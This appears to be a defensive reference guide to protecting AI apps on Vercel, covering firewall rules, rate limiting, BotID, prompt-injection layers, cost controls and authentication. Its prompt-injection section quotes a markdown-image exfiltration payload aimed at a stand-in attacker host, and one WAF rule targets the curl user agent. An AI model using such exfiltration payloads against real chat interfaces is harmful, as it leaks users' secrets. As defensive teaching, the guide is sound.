# Security & Abuse Protection for AI Applications

Comprehensive reference for securing AI apps on Vercel — from infrastructure-level firewall rules to application-level bot detection and cost controls.

## Table of Contents

1. [Defense-in-Depth Overview](#defense-in-depth-overview)
2. [Vercel Firewall & WAF](#vercel-firewall--waf)
3. [Custom Rules](#custom-rules)
4. [Rate Limiting](#rate-limiting)
5. [BotID — Invisible Bot Detection](#botid--invisible-bot-detection)
6. [Managed Rulesets](#managed-rulesets)
7. [Attack Challenge Mode](#attack-challenge-mode)
8. [IP Blocking & Geo-Blocking](#ip-blocking--geo-blocking)
9. [Securing AI Endpoints](#securing-ai-endpoints)
10. [Cost Protection](#cost-protection)
11. [Authentication for AI Routes](#authentication-for-ai-routes)

---

## Defense-in-Depth Overview

Secure AI apps require multiple layers. Each request passes through these in order:

```
Request → DDoS Mitigation (auto) → IP Blocking → Custom Rules → Managed Rulesets → Your App
                                                                                      ↓
                                                              BotID / Auth / Rate Limit / maxTokens
```

| Layer | Feature | Plan | Purpose |
|-------|---------|------|---------|
| Edge | DDoS Mitigation (L3/L4/L7) | All (free) | Automatic, no config |
| Edge | Attack Challenge Mode | All (free) | Emergency JS challenge for all visitors |
| Edge | Bot Protection Ruleset | All | Challenge non-browser traffic |
| Edge | AI Bots Ruleset | All | Block AI crawlers/scrapers |
| Edge | Custom WAF Rules | Hobby: 3, Pro: 40, Ent: 1000 | Deny, challenge, rate-limit, redirect |
| Edge | IP Blocking | Hobby: 10, Pro: 100 | Block specific IPs/CIDRs |
| Edge | OWASP Core Ruleset | Enterprise | SQL injection, XSS, etc. |
| App | BotID (invisible verification) | All (Basic free, Deep Analysis $1/1k calls) | Detect bots without CAPTCHAs |
| App | `@vercel/firewall` SDK | All | Programmatic rate limiting with custom keys |
| App | Auth + entitlement quotas | All (your code) | Per-user/tier usage limits |
| App | `maxTokens`, `stopWhen`, `maxDuration` | All | Cap AI resource consumption |
| CI/CD | `eslint-plugin-vercel-ai-security` | All | 19 OWASP LLM Top 10 lint rules |
| Billing | Spend Management | Pro+ | Auto-pause at budget limit |

---

## Vercel Firewall & WAF

The Vercel Firewall is built into the Edge Network. Every request passes through it before reaching your application. Configuration changes propagate globally in ~300ms and can be rolled back instantly.

### Rule Execution Order

1. DDoS mitigation (automatic)
2. IP blocking rules
3. Custom rules (in user-defined order)
4. Managed rulesets (Bot Protection, AI Bots, OWASP)

Custom rules execute before managed rulesets, so a **Bypass** rule placed above a managed ruleset allows specific traffic through.

### Available Actions

| Action | Behavior | Response |
|--------|----------|----------|
| **Log** | Records the match, request proceeds | Pass-through |
| **Deny** | Blocks immediately, never reaches your app | `403` |
| **Challenge** | JavaScript verification — bots/scripts fail, sessions last 1 hour | Challenge page |
| **Bypass** | Skips all subsequent firewall rules | Pass-through |
| **Redirect** | Sends to a different URL (301 or 302) | `301`/`302` |
| **Rate Limit** | Counts requests per source in a time window; triggers a follow-up action | `429` (default) |

### Persistent Actions

When enabled on Challenge, Deny, or Rate Limit: the source IP is stored at the platform level and **all** future requests from it are blocked for a configurable duration (e.g., `"1h"`). These blocks happen before the WAF, so blocked requests don't count toward CDN/traffic usage.

---

## Custom Rules

### Condition Structure

Rules use `conditionGroup` — an array of condition sets. Sets use **OR** logic between them, **AND** logic within each set:

```json
{
  "conditionGroup": [
    {
      "conditions": [
        { "type": "path", "op": "pre", "value": "/api/chat" },
        { "type": "method", "op": "eq", "value": "POST" }
      ]
    },
    {
      "conditions": [
        { "type": "geo_country", "op": "inc", "value": ["CN", "RU"] }
      ]
    }
  ]
}
```

This means: `(path starts with /api/chat AND method is POST) OR (country is CN or RU)`.

### Condition Parameters

| Parameter | Description | Plan |
|-----------|-------------|------|
| `path` | Request path (supports `/blog/[slug]` patterns) | All |
| `method` | HTTP method | All |
| `ip_address` | Client IP | All |
| `geo_country` | ISO 3166-1 country code | All |
| `geo_country_region` | Region/state within country | All |
| `geo_city` | City name | All |
| `geo_as_number` | ASN (Autonomous System Number) | All |
| `user_agent` | User-Agent header | All |
| `header` | Arbitrary header (specify `key`) | All |
| `cookie` | Cookie value (specify `key`) | All |
| `host` | Host header / domain | All |
| `query` | Query string | All |
| `ja4_digest` | JA4 TLS fingerprint | All |
| `ja3_digest` | JA3 TLS fingerprint (legacy) | Enterprise |
| `protocol` | Request protocol | All |
| `@vercel/firewall` | Programmatic SDK trigger | All |

### Operators (all case-insensitive)

| Operator | Meaning |
|----------|---------|
| `eq` | Equals |
| `neq` | Not equals |
| `pre` | Starts with |
| `suf` | Ends with |
| `sub` | Contains |
| `re` | Regex (PCRE) |
| `ex` | Exists |
| `nex` | Does not exist |
| `inc` | Includes (for arrays — multiple countries, ASNs) |
| `gt`, `gte`, `lt`, `lte` | Numeric comparisons |

Add `"neg": true` to negate any condition.

### Configuration via `vercel.json`

Only `challenge` and `deny` are supported (no rate-limit, bypass, or redirect). Uses route matching:

```json
{
  "routes": [
    {
      "src": "/api/chat(.*)",
      "has": [{ "type": "header", "key": "x-suspicious-header" }],
      "mitigate": { "action": "deny" }
    }
  ]
}
```

### Configuration via REST API

Full feature set. Example — challenge cURL requests:

```typescript
await fetch(
  `https://api.vercel.com/v1/security/firewall/config?projectId=${projectId}&teamId=${teamId}`,
  {
    method: 'PATCH',
    headers: {
      Authorization: `Bearer ${process.env.VERCEL_TOKEN}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      action: 'rules.insert',
      id: null,
      value: {
        active: true,
        name: 'Challenge cURL',
        conditionGroup: [{
          conditions: [{ op: 'sub', type: 'user_agent', value: 'curl' }],
        }],
        action: {
          mitigate: { action: 'challenge', rateLimit: null, redirect: null, actionDuration: null },
        },
      },
    }),
  }
);
```

### Best Practice: Start with Log

Deploy rules in **Log** mode first, observe traffic for 10 minutes in the Firewall dashboard, then switch to Deny/Challenge once you're confident.

---

## Rate Limiting

Three approaches, from infrastructure-level to code-level.

### Method 1: WAF Dashboard Rate Limiting

Create via Firewall > Configure > + New Rule > Rate Limit action.

| Setting | Hobby/Pro | Enterprise |
|---------|-----------|-----------|
| Algorithm | Fixed window | Fixed window + Token bucket |
| Window range | 10s – 10min | 10s – 1hr |
| Counting keys | IP, JA4 | IP, JA4, User-Agent, custom headers |
| Rules per project | 1 (Hobby) / 40 (Pro) | 1,000 |

### Method 2: `@vercel/firewall` SDK (Programmatic)

Useful when rate-limiting needs application context (user ID, org, tier).

**Step 1:** Create a `@vercel/firewall` rule in the Dashboard with a Rate Limit ID.

**Step 2:** Use in code:

```typescript
import { checkRateLimit } from '@vercel/firewall';

export async function POST(request: Request) {
  const { rateLimited } = await checkRateLimit('ai-chat-limit', { request });

  if (rateLimited) {
    return new Response(JSON.stringify({ error: 'Rate limit exceeded' }), {
      status: 429,
      headers: { 'Content-Type': 'application/json' },
    });
  }
  // process AI request...
}
```

**Per-organization rate limiting:**

```typescript
import { checkRateLimit } from '@vercel/firewall';

export async function POST(request: Request) {
  const auth = await authenticateUser(request);
  const { rateLimited } = await checkRateLimit('ai-chat-limit', {
    request,
    rateLimitKey: auth.orgId, // Rate limit per org, not per IP
  });
  if (rateLimited) return new Response('Rate limit exceeded', { status: 429 });
  // ...
}
```

### Method 3: Upstash Ratelimit (Code-Level with Redis)

When you need full control or aren't on Vercel:

```typescript
import { Redis } from '@upstash/redis';
import { Ratelimit } from '@upstash/ratelimit';
import { streamText } from 'ai';
import { openai } from '@ai-sdk/openai';

const redis = Redis.fromEnv();
const ratelimit = new Ratelimit({
  redis,
  limiter: Ratelimit.fixedWindow(5, '30s'),
});

export async function POST(req: Request) {
  const ip = req.headers.get('x-forwarded-for') ?? '127.0.0.1';
  const { success } = await ratelimit.limit(ip);

  if (!success) return new Response('Ratelimited!', { status: 429 });

  const { messages } = await req.json();
  const result = streamText({ model: openai('gpt-4o'), messages });
  return result.toDataStreamResponse();
}
```

---

## BotID — Invisible Bot Detection

BotID is an invisible CAPTCHA (no user-facing challenge) powered by Kasada. It collects thousands of client-side signals, detects automation frameworks, and returns a deterministic `isBot: true/false`. Detection logic mutates on every page load to resist reverse engineering.

### Setup

```bash
npm install botid
```

### Step 1: Configure rewrites (proxy the challenge script)

**Next.js** (`next.config.ts`):
```typescript
import { withBotId } from 'botid/next/config';
export default withBotId(nextConfig);
```

**Nuxt** (`nuxt.config.ts`):
```typescript
export default defineNuxtConfig({ modules: ['botid/nuxt'] });
```

**Other frameworks** — add rewrites in `vercel.json`:
```json
{
  "rewrites": [
    {
      "source": "/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/a-4-a/c.js",
      "destination": "https://api.vercel.com/bot-protection/v1/challenge"
    },
    {
      "source": "/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/:path*",
      "destination": "https://api.vercel.com/bot-protection/v1/proxy/:path*"
    }
  ]
}
```

### Step 2: Client-side initialization

**Next.js 15.3+** (`instrumentation-client.ts`):
```typescript
import { initBotId } from 'botid/client/core';

initBotId({
  protect: [
    { path: '/api/chat', method: 'POST' },
    { path: '/api/generate', method: 'POST' },
    { path: '/api/checkout', method: 'POST' },
  ],
});
```

**Next.js < 15.3** (component in layout `<head>`):
```tsx
import { BotIdClient } from 'botid/client';

export default function RootLayout({ children }) {
  return (
    <html>
      <head>
        <BotIdClient protect={[{ path: '/api/chat', method: 'POST' }]} />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

**SvelteKit** (`src/hooks.client.ts`):
```typescript
import { initBotId } from 'botid/client/core';
export function init() {
  initBotId({ protect: [{ path: '/api/post-data', method: 'POST' }] });
}
```

### Step 3: Server-side verification

```typescript
import { checkBotId } from 'botid/server';

export async function POST(request: Request) {
  const verification = await checkBotId();

  if (verification.isBot) {
    return Response.json({ error: 'Access denied' }, { status: 403 });
  }

  // Process the request...
}
```

**In a Server Action:**
```typescript
'use server';
import { checkBotId } from 'botid/server';

export async function submitForm(formData: FormData) {
  const { isBot } = await checkBotId();
  if (isBot) throw new Error('Access denied');
  // process formData...
}
```

### `checkBotId()` Return Object

| Property | Type | Description |
|----------|------|-------------|
| `isBot` | `boolean` | `true` if automated traffic |
| `isHuman` | `boolean` | `true` if real human |
| `isVerifiedBot` | `boolean` | Known legitimate bot (Googlebot etc.) |
| `verifiedBotName` | `string?` | e.g. `"googlebot"`, `"chatgpt-operator"` |
| `verifiedBotCategory` | `string?` | e.g. `"search_engine_crawler"`, `"ai_assistant"` |
| `bypassed` | `boolean` | WAF bypass rule exempted this request |

### Handling Verified Bots Selectively

```typescript
const { isBot, isVerifiedBot, verifiedBotName } = await checkBotId();

const allowedBots = ['chatgpt-operator', 'perplexitybot'];
const isAllowed = isVerifiedBot && allowedBots.includes(verifiedBotName ?? '');

if (isBot && !isAllowed) {
  return Response.json({ error: 'Access denied' }, { status: 403 });
}
```

### Route-Level Check Level

Override per route between `basic` (free) and `deepAnalysis` ($1/1k calls). Client and server `checkLevel` must match exactly:

```typescript
// Client
initBotId({
  protect: [
    { path: '/api/checkout', method: 'POST', advancedOptions: { checkLevel: 'deepAnalysis' } },
    { path: '/api/contact', method: 'POST', advancedOptions: { checkLevel: 'basic' } },
  ],
});

// Server — must match client
const verification = await checkBotId({
  advancedOptions: { checkLevel: 'deepAnalysis' },
});
```

### Separate Backend Domains

When frontend and API are on different origins:
```typescript
const verification = await checkBotId({
  advancedOptions: { extraAllowedHosts: ['app.example.com', 'dashboard.example.com'] },
});
```

### Key Limitations

- `checkBotId()` **cannot run in Next.js middleware** — only in route handlers and server actions
- Routes must be declared on the client first (in `initBotId({ protect })`) — if a path isn't listed, the client won't attach headers and `checkBotId()` will fail
- `checkLevel` must match between client and server
- Requires Vercel deployment — in local dev, always returns `{ isBot: false }` (use `developmentOptions: { bypass: 'BAD-BOT' }` to simulate bots)
- Native HTML `<form>` submissions are not supported — use `fetch()` or server actions
- Does not work behind reverse proxies (Cloudflare, Azure CDN)
- Testing with `curl` will always be blocked in production

### Pricing

| Mode | Plans | Price |
|------|-------|-------|
| Basic | All | Free |
| Deep Analysis | Pro, Enterprise | $1 per 1,000 `checkBotId()` calls |

### Verified Bots Directory

Vercel maintains a continuously updated directory at **bots.fyi** with 193+ known bots. Categories include: `search_engine_crawler`, `ai_assistant`, `ai_crawler`, `ai_training`, `social_media`, `monitoring`, `feed_fetcher`, `e_commerce`, `seo`, `preview`, `webhook`, `advertising`, `accessibility`, `analytics`, `verification`, `user_initiated`, `ai_no_training`.

### Package Exports

| Import | Purpose |
|--------|---------|
| `botid/client/core` | `initBotId()` — all frameworks |
| `botid/client` | `<BotIdClient />` — React component |
| `botid/server` | `checkBotId()` — server verification |
| `botid/next/config` | `withBotId()` — Next.js config wrapper |
| `botid/nuxt` | Nuxt module |

---

## Managed Rulesets

### Bot Protection (all plans)

Challenges non-browser traffic automatically. Identifies clients violating browser-like behavior, prevents spoofed user-agents, excludes verified bots.

Enable: Firewall > Rules > Bot Management > Bot Protection > **Challenge**

### AI Bots (all plans)

Identifies and blocks known AI crawlers (GPTBot, ClaudeBot, Bytespider, CCBot, etc.). Vercel maintains and updates the list automatically.

Enable: Firewall > Rules > Bot Management > AI Bots Ruleset > **Deny**

### OWASP Core Ruleset (Enterprise)

Addresses OWASP Top 10 (SQL injection, XSS, etc.). Enable in Log mode first, monitor, then switch to Deny.

---

## Attack Challenge Mode

Emergency toggle — challenges **all** incoming traffic with a JavaScript verification. Free on all plans, unlimited.

- Automatically allows verified bots, internal Functions, and Cron Jobs
- No SEO impact (crawlers pass through)
- Blocked traffic does NOT count toward usage
- Direct API calls (curl, Postman) cannot pass

Enable: Firewall > Bot Management > Attack Challenge Mode

---

## IP Blocking & Geo-Blocking

### IP Blocking

```typescript
// Via REST API
await fetch(`https://api.vercel.com/v1/security/firewall/config?projectId=${id}&teamId=${tid}`, {
  method: 'PATCH',
  headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
  body: JSON.stringify({
    action: 'ip.insert',
    id: null,
    value: { action: 'deny', hostname: '*', ip: '12.34.56.0/24', notes: 'Malicious network' },
  }),
});
```

Limits: Hobby 10, Pro 100, Enterprise custom.

### Geo-Blocking Example: OFAC-Sanctioned Countries

```json
{
  "name": "Block OFAC-sanctioned countries",
  "active": true,
  "action": {
    "mitigate": { "action": "deny", "actionDuration": "1h" }
  },
  "conditionGroup": [
    {
      "conditions": [
        { "type": "geo_country", "op": "inc", "value": ["IR", "RU", "CU", "KP"] }
      ]
    }
  ]
}
```

---

## Securing AI Endpoints

AI routes are high-value targets because each request triggers expensive model inference. Layer these protections specifically on your AI paths (`/api/chat`, `/api/generate`, etc.).

### Secure Route Handler Pattern

```typescript
// app/api/chat/route.ts
import { streamText, stepCountIs } from 'ai';
import { openai } from '@ai-sdk/openai';

export const maxDuration = 30; // Hard cap on streaming time

export async function POST(req: Request) {
  const { messages } = await req.json();

  // Strip system messages from user input (prevent prompt injection)
  const sanitized = messages.filter((m: { role: string }) => m.role !== 'system');

  const result = streamText({
    model: openai('gpt-4o'),
    system: 'You are a helpful assistant.', // Server-controlled only
    messages: sanitized,
    maxTokens: 4096,              // Cap output tokens
    stopWhen: stepCountIs(5),     // Prevent infinite agent loops
    abortSignal: req.signal,      // Honor client disconnection
  });

  return result.toDataStreamResponse();
}
```

### Prompt Injection Prevention

The AI SDK does **not** have built-in prompt injection protection. Defense requires multiple layers:

**Layer 1 — Strip system messages:**
```typescript
const sanitized = messages.filter((m) => m.role !== 'system');
```

**Layer 2 — Validate input structure:**
```typescript
import { z } from 'zod';

const MessageSchema = z.object({
  messages: z.array(z.object({
    role: z.enum(['user', 'assistant']), // Only allow user/assistant
    content: z.string().max(10000),
  })).max(50),
});

const { messages } = MessageSchema.parse(await req.json());
```

**Layer 3 — Output sanitization:**

Prevent data exfiltration through markdown rendering (e.g., `![](https://attacker.com/leak?data=SECRET)`). Use `harden-react-markdown` or sanitize model output before rendering.

**Layer 4 — Tool scope binding:**

```typescript
// UNSAFE: model can choose tenantId
const unsafeTool = tool({
  inputSchema: z.object({ tenantId: z.string(), query: z.string() }),
  execute: async ({ tenantId, query }) => db.query(tenantId, query),
});

// SAFE: tenantId bound to the authenticated user
const safeTool = tool({
  inputSchema: z.object({ query: z.string() }),
  execute: async ({ query }) => db.query(authenticatedUser.tenantId, query),
});
```

**Layer 5 — Require tool confirmation for destructive operations:**
```typescript
const deleteTool = tool({
  description: 'Delete a document',
  inputSchema: z.object({ docId: z.string() }),
  needsApproval: true, // UI shows approval prompt before execution
  execute: async ({ docId }) => { /* ... */ },
});
```

### ESLint Plugin for AI Security

Catches vulnerabilities at build time — 19 rules covering OWASP LLM Top 10 2025:

```bash
npm install --save-dev eslint-plugin-vercel-ai-security
```

```javascript
// eslint.config.js
import vercelAI from 'eslint-plugin-vercel-ai-security';
export default [vercelAI.configs.recommended];
```

Key rules:
- `require-validated-prompt` — no unvalidated user input in prompts
- `no-dynamic-system-prompt` — system prompt must be static
- `require-max-tokens` — every generation must cap tokens
- `require-abort-signal` — prevent orphaned generations
- `require-max-steps` — agents must have step limits
- `require-tool-confirmation` — destructive tools need approval
- `no-sensitive-in-prompt` — no API keys/secrets in prompts
- `no-system-prompt-leak` — prevent system prompt exfiltration

### BotID on AI Endpoints

The most impactful single protection — prevents bots from consuming your AI API credits:

```typescript
import { checkBotId } from 'botid/server';
import { streamText } from 'ai';
import { openai } from '@ai-sdk/openai';

export async function POST(req: Request) {
  const { isBot } = await checkBotId();
  if (isBot) return Response.json({ error: 'Access denied' }, { status: 403 });

  const { messages } = await req.json();
  const result = streamText({ model: openai('gpt-4o'), messages });
  return result.toDataStreamResponse();
}
```

### Protecting AI from DDoS and WAF Rate Limiting Combined

A practical setup for an AI chat endpoint using both WAF rules and BotID:

```typescript
// instrumentation-client.ts — client-side BotID
import { initBotId } from 'botid/client/core';
initBotId({
  protect: [
    { path: '/api/chat', method: 'POST' },
    { path: '/api/generate', method: 'POST' },
  ],
});
```

Plus in the Dashboard:
1. WAF Rate Limit rule on `/api/chat` — 20 requests per 60 seconds per IP
2. Bot Protection managed ruleset — Challenge non-browser traffic
3. AI Bots managed ruleset — Deny scrapers

---

## Cost Protection

### Vercel Spend Management

Enabled by default on Pro. Prevents runaway bills from AI abuse:

- **Default budget**: $200/billing cycle (customizable)
- **Notifications**: Email/web/SMS at 50%, 75%, 100%
- **Auto-pause**: Optionally pause deployments at 100%
- **Webhooks**: Programmatic notification at thresholds

Configure: Team Settings > Billing > Spend Management

```json
{
  "budgetAmount": 500,
  "currentSpend": 500,
  "teamId": "team_xxx",
  "thresholdPercent": 100
}
```

Secure webhooks by comparing `x-vercel-signature` header.

### AI SDK Resource Guards

```typescript
import { streamText, stepCountIs } from 'ai';

const result = streamText({
  model: openai('gpt-4o'),
  messages,
  maxTokens: 4096,              // Hard cap on output
  stopWhen: stepCountIs(5),     // Prevent infinite agent loops
  abortSignal: req.signal,      // Honor client disconnection
});

export const maxDuration = 30; // Limit streaming to 30 seconds
```

### Entitlement-Based Quotas (Per-User Limits)

Pattern from the official Vercel AI chatbot template:

```typescript
// lib/ai/entitlements.ts
const entitlementsByUserType = {
  guest: { maxMessagesPerDay: 10 },
  registered: { maxMessagesPerDay: 100 },
  premium: { maxMessagesPerDay: 1000 },
};

// app/api/chat/route.ts
const messageCount = await getMessageCountByUserId(session.user.id);
const entitlements = entitlementsByUserType[session.user.type];

if (messageCount >= entitlements.maxMessagesPerDay) {
  return Response.json({ error: 'Daily limit reached' }, { status: 429 });
}
```

---

## Authentication for AI Routes

### NextAuth v5 Middleware

```typescript
// middleware.ts
import { auth } from './auth';

export default auth((req) => {
  if (!req.auth && req.nextUrl.pathname.startsWith('/api/chat')) {
    return Response.redirect(new URL('/login', req.url));
  }
});

export const config = { matcher: ['/api/chat/:path*'] };
```

### Per-Route Session Validation

Middleware alone is not enough (CVE-2025-29927 — Next.js middleware authorization bypass). Always verify at the data access level:

```typescript
// app/api/chat/route.ts
import { auth } from '@/auth';

export async function POST(req: Request) {
  const session = await auth();
  if (!session) return new Response('Unauthorized', { status: 401 });
  // ...
}
```

### Chat Ownership Verification

```typescript
const chat = await getChatById(params.id);
if (chat.userId !== session.user.id) {
  redirect('/'); // Prevent cross-user access
}
```

### AI Gateway Authentication

- **On Vercel**: Automatic OIDC token auth (zero config)
- **Self-hosted**: `AI_GATEWAY_API_KEY` environment variable

---

## TLS Fingerprinting (JA3/JA4)

Available as request headers in your Functions:

```typescript
const ja4 = request.headers.get('x-vercel-ja4-digest');
const ja3 = request.headers.get('x-vercel-ja3-digest');
```

A DDoS using rotating IPs may share the same TLS fingerprint — enabling blocking of the entire attack surface with a single WAF rule on `ja4_digest`.

---

## Firewall Observability

### Dashboard Monitoring
- Line graph of traffic, active alerts, denied IPs
- Drill-down by IP, User-Agent, Path, ASN, JA4, Country
- Time windows: Live (10-min), past hour, past 24 hours

### DDoS Alerts
- Triggered when malicious traffic exceeds 100,000 requests in 10 minutes
- Delivery via Webhooks or Vercel Slack app

### Log Drains
Send firewall logs to external SIEM systems (Datadog, Splunk, etc.).

---

## Ready-to-Deploy Rule Templates

Vercel provides pre-built templates at `vercel.com/templates/vercel-firewall`:

1. **Rate Limit API Requests** — Fixed-window on `/api` paths
2. **Block OFAC-Sanctioned Countries** — Geo-block IR, RU, CU, KP
3. **Emergency Redirect** — Instant path redirect without redeployment
4. **Block WordPress URLs** — Block `/wp-admin`, `wp-login.php`, `xmlrpc.php`
5. **Block Bad Bots** — Regex matching 500+ malicious bot user-agents
6. **Block AI Bots** — Block GPTBot, ClaudeBot, Bytespider, CCBot
